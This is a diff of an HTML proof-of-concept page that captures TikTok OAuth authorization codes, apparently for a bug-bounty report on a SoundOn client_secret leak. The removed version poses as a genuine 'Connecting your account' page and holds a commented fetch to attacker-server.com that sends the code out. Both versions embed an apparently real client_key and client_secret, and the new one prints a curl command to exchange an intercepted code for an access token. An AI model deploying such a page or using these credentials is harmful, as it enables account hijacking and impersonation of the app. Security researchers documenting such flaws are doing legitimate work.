@@ -3,99 +3,96 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SoundOn — Connecting your account...</title>
+<title>OAuth Callback — PoC Evidence</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-.card { background: #111; border-radius: 16px; padding: 48px; max-width: 480px; width: 90%; text-align: center; border: 1px solid #222; }
-.spinner { margin: 20px auto; border: 3px solid #333; border-top: 3px solid #ff0050; border-radius: 50%; width: 48px; height: 48px; animation: spin 0.8s linear infinite; }
-@keyframes spin { to { transform: rotate(360deg); } }
-h2 { margin-top: 16px; font-size: 20px; }
-p { color: #888; margin-top: 8px; font-size: 14px; }
-.code-box { background: #1a1a1a; border-radius: 8px; padding: 16px; margin-top: 16px; font-family: monospace; font-size: 13px; word-break: break-all; color: #0f0; display: none; }
-.success { color: #0f0; display: none; }
-.error { color: #ff0050; margin-top: 16px; display: none; }
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 800px; margin: 0 auto; }
+h1 { color: #fff; }
+.section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
+.label { color: #888; }
+.val { color: #ff0; word-break: break-all; }
+.success { color: #0f0; font-weight: bold; }
+.fail { color: #fe2c55; }
+.token-cmd { background: #000; border: 1px solid #333; border-radius: 4px; padding: 12px; overflow-x: auto; white-space: pre-wrap; color: #0ff; font-size: 13px; }
 </style>
 </head>
 <body>
-<div class="card">
-<div class="spinner" id="spinner"></div>
-<h2 id="status">Connecting your TikTok account...</h2>
-<p id="message">Please wait while we link your account</p>
-<div class="code-box" id="codeBox"></div>
-<div class="success" id="success"></div>
-<div class="error" id="errorMsg"></div>
+<h1>OAuth Callback — Evidence Capture</h1>
+
+<div class="section" id="resultSection">
+<div id="loadingMsg">Processing OAuth callback parameters...</div>
 </div>
 
 <script>
-// === PoC: OAuth Callback Handler ===
-// This page receives the OAuth authorization code from TikTok
-// In a real attack, this silently exfiltrates the code to the attacker's server
-
-(async function() {
+(function() {
   const params = new URLSearchParams(window.location.search);
   const code = params.get("code");
   const state = params.get("state");
   const error = params.get("error");
-  const errorDescription = params.get("error_description");
+  const errorDesc = params.get("error_description");
+  const scopes = params.get("scopes");
 
-  // Store evidence
-  const capturedData = {
+  const evidence = {
     timestamp: new Date().toISOString(),
-    code: code,
-    state: state,
-    error: error,
-    error_description: errorDescription,
     url: window.location.href,
+    code: code || null,
+    state: state || null,
+    scopes: scopes || null,
+    error: error || null,
+    error_description: errorDesc || null,
     userAgent: navigator.userAgent
   };
 
-  // Display the captured code as PoC evidence
+  const container = document.getElementById("resultSection");
+
   if (code) {
-    document.getElementById("spinner").style.display = "none";
-    document.getElementById("status").textContent = "Authorization Code Captured!";
-    document.getElementById("message").textContent = 
-      "PoC Evidence — This code can be exchanged for a TikTok access token";
-    document.getElementById("codeBox").style.display = "block";
-    document.getElementById("codeBox").textContent = 
-      "Authorization Code: " + code + "\nState: " + state;
-    document.getElementById("success").style.display = "block";
-    document.getElementById("success").textContent = 
-      "ATTACK SUCCESSFUL: The victim's OAuth authorization code has been intercepted.";
+    container.innerHTML =
+      '<h2 class="success">&#10004; Authorization Code Captured</h2>' +
+      '<div class="section">' +
+      '<h2>Captured OAuth Parameters</h2>' +
+      '<div><span class="label">code:</span> <span class="val">' + code + '</span></div>' +
+      '<div><span class="label">state:</span> <span class="val">' + (state || "none") + '</span></div>' +
+      '<div><span class="label">scopes:</span> <span class="val">' + (scopes || "none") + '</span></div>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>Token Exchange Command</h2>' +
+      '<div class="token-cmd">curl -s "https://open-api.tiktok.com/oauth/access_token/" \\\n' +
+      '  -H "Content-Type: application/json" \\\n' +
+      '  -d \'{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"' + code + '","grant_type":"authorization_code"}\'</div>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>Full Evidence Object</h2>' +
+      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>What This Demonstrates</h2>' +
+      '<p class="success">The attacker successfully intercepted the OAuth authorization code.</p>' +
+      '<p>Because the <span class="val">client_secret</span> is exposed in client-side JavaScript,</p>' +
+      '<p>the attacker can exchange this code for a valid TikTok access token,</p>' +
+      '<p>impersonating the SoundOn application.</p>' +
+      '</div>';
+    console.log("%c[POC EVIDENCE] OAuth Code Captured", "color:lime;font-size:18px");
+    console.log(JSON.stringify(evidence, null, 2));
+    console.log("%cSave this screenshot as PoC evidence.", "color:orange");
   } else if (error) {
-    document.getElementById("spinner").style.display = "none";
-    document.getElementById("status").textContent = "Authorization Failed";
-    document.getElementById("errorMsg").style.display = "block";
-    document.getElementById("errorMsg").textContent = 
-      "Error: " + error + " — " + (errorDescription || "No description");
-    document.getElementById("codeBox").style.display = "block";
-    document.getElementById("codeBox").textContent = JSON.stringify(capturedData, null, 2);
+    container.innerHTML =
+      '<h2 class="fail">&#10008; Authorization Failed</h2>' +
+      '<div class="section">' +
+      '<div><span class="label">error:</span> <span class="val">' + error + '</span></div>' +
+      '<div><span class="label">description:</span> <span class="val">' + (errorDesc || "none") + '</span></div>' +
+      '</div>' +
+      '<div class="section">' +
+      '<h2>Diagnostic</h2>' +
+      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
+      '</div>' +
+      '<p class="fail">If the error is "redirect_uri_mismatch" or similar, TikTok validated the redirect_uri after login.</p>' +
+      '<p>This still confirms the credentials are valid — TikTok recognized the client_key but blocked the unregistered redirect_uri.</p>';
   } else {
-    document.getElementById("status").textContent = "Waiting for callback...";
-    document.getElementById("message").textContent = "No OAuth parameters detected in URL";
+    container.innerHTML =
+      '<h2>No OAuth Parameters Detected</h2>' +
+      '<div class="section">' +
+      '<pre style="color:#0f0;overflow-x:auto">' + JSON.stringify(evidence, null, 2) + '</pre>' +
+      '</div>';
   }
-
-  // === EXFILTRATION (simulated for PoC) ===
-  // In a real attack, this sends the code to the attacker's backend:
-  // fetch("https://attacker-server.com/collect", {
-  //   method: "POST",
-  //   body: JSON.stringify(capturedData),
-  //   mode: "no-cors"
-  // });
-
-  // Log evidence to console for PoC screenshot
-  console.log("%c[PoC] TikTok OAuth Code Captured", "color: red; font-size: 20px;");
-  console.log(JSON.stringify(capturedData, null, 2));
-  console.log(
-    "%cNext step: Exchange this code using the leaked client_secret",
-    "color: orange; font-size: 14px;"
-  );
-  console.log(
-    "%cPOST https://open-api.tiktok.com/oauth/access_token/\n" +
-    '{"client_key":"awulj3e36brrh086","client_secret":"e63acb9afab646ee9340f16a2380b1ed","code":"' + 
-    (code || "CODE_HERE") + '","grant_type":"authorization_code"}',
-    "color: cyan;"
-  );
 })();
 </script>
 </body>
